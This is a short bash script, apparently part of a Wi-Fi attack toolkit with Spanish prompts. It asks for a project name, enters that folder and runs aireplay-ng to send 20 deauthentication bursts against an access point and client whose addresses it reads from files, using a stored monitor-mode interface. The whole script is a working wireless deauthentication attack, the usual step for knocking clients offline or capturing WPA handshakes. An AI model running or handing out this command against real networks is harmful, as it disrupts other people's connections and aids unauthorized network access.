#!/bin/bash
read -p "Nombre del proyecto: " archivo
cd $archivo
sudo aireplay-ng -0 20 -a `cat bssid` -c `cat cbssid` `cat ../mon`
